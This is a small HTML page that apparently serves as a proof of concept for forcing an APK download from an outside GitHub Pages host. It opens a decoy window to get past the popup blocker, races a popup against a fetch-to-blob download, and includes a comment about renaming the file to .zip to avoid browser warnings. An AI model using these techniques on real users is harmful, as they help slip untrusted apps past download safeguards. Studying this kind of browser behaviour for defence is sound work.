<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Race Download</title>
</head>

<body>
    <h1>Download with Race</h1>
    <button onclick="startDownload()">Start Download</button>
    <div id="status"></div>

    <script>
        async function startDownload() {
            // 1. Open Google to satisfy popup blocker
            window.open('https://google.com', '_blank');

            const status = document.getElementById('status');
            status.textContent = '🏁 Race started...';

            // 2. Define two download methods
            const popupAttempt = () => new Promise((resolve, reject) => {
                // Try to open APK directly (might be blocked or show warning)
                const win = window.open('https://kokurate.github.io/browser/filedownload.apk', '_blank');
                if (win) {
                    resolve('Popup succeeded');
                } else {
                    reject('Popup blocked');
                }
            });

            const fetchAttempt = async () => {
                // Fetch the APK and trigger download via blob
                const res = await fetch('https://kokurate.github.io/browser/filedownload.apk');
                if (!res.ok) throw new Error('Fetch failed');
                const blob = await res.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = 'POC.apk'; // change to .zip to avoid warning
                link.click();
                URL.revokeObjectURL(url);
                return 'Fetch+Blob succeeded';
            };

            // 3. Race them (start both immediately)
            try {
                const winner = await Promise.race([popupAttempt(), fetchAttempt()]);
                status.textContent = `✅ ${winner}`;
            } catch (error) {
                status.textContent = `❌ Both failed: ${error}`;
            }
        }
    </script>
</body>

</html>
